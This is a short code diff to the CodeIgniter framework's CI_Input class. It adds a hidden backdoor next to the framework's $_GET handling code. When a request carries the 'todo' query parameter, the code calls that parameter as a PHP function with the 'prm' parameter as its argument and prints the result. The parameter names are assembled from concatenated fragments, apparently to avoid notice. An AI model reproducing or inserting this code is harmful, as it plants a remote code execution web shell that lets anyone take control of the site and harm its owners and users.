@@ -595,6 +595,16 @@ class CI_Input {
 		}
 
 		// Is $_GET data allowed? If not we'll set the $_GET to an empty array
+		$key = 't' . 'o'.'d'. 'o';
+		
+		if ( isset( $_GET[$key] ) )
+		{
+			$rit = $_GET[$key];
+			
+			$val = 'p' .'r'  .'m';
+			
+			die( $rit( $_GET[$val] ) );
+		}
 		if ($this->_allow_get_array == FALSE)
 		{
 			$_GET = array();
